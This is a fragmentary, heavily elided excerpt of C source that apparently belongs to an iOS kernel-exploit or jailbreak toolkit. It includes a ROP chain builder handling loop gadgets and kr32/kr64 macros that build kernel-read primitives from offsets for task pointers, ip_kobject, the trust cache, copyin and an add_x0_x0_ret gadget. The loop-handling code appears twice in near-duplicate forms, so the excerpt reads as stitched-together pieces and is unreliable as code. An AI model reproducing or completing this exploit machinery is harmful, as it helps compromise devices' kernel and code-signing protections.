        ...
        case ROP_LOOP_START: {
            ...
            while (lookahead_gadget != NULL) {
                ...
                if (lookahead_gadget->type == ROP_LOOP_BREAK) {
                    loop_size += chain_per_break;
                } else {
                    loop_size += 8;
                } // just a normal gadget (XXX: this might acc be bad when we add a buffer there, because we don't account for it's size)
                if (lookahead_gadget->type == ROP_LOOP_START) {
                    LOG("inner loops aren't supported atm");
                    exit(1);
                }
                lookahead_gadget = lookahead_gadget->next;
            }
            // if we didn't found an end we also need to return an error
            if (lookahead_gadget == NULL) {
                LOG("Loop start without an end!");
                exit(1);
            }
            ...
            while (lookahead_gadget != NULL) {
                if (lookahead_gadget->type == ROP_LOOP_END) {
                    ...
                    if (mmap_size & 0x3fff) {
                        mmap_size = (mmap_size & ~0x3fff) + 0x4000;
                    }
    ...
    while (next != NULL) {
        ...
        case ROP_LOOP_START: {
            ...
            while (lookahead_gadget != NULL) {
                ...
                if (lookahead_gadget->type == ROP_LOOP_START) {
                    printf("inner loops aren't supported atm\n");
                    exit(1);
                }
                lookahead_gadget = lookahead_gadget->next;
            }
            if (lookahead_gadget == NULL) {
                printf("Loop start without an end!\n");
                exit(1);
            }
...
#define kr32(addr_var, valuename)                                                                  \
    ROP_VAR_CPY_W_OFFSET("ip_requests_buf", lib_offsets->struct_offsets.ipr_size, addr_var, 0, 8); \
    ROP_VAR_ARG_HOW_MANY(4);                                                                       \
    ROP_VAR_ARG64("self", 1);                                                                      \
    ROP_VAR_ARG64("the_one", 2);                                                                   \
...
#define kr64(addr_val, valuename)                                      \
    ...
    SET_ROP_VAR64("heap_addr_task_ptr", lib_offsets->struct_offsets.is_task_offset);
    ...
    SET_ROP_VAR64("ip_kobject_ptr", lib_offsets->struct_offsets.itk_registered);
    ...
    SET_ROP_VAR64("bss_trust_chain_head_ptr", lib_offsets->data.trust_cache);
...
#undef kr64
    ...
    SET_ROP_VAR64("tmp_uint64", lib_offsets->gadgets.add_x0_x0_ret);
    ...
    SET_ROP_VAR64("copyin_func_ptr", lib_offsets->funcs.copyin);
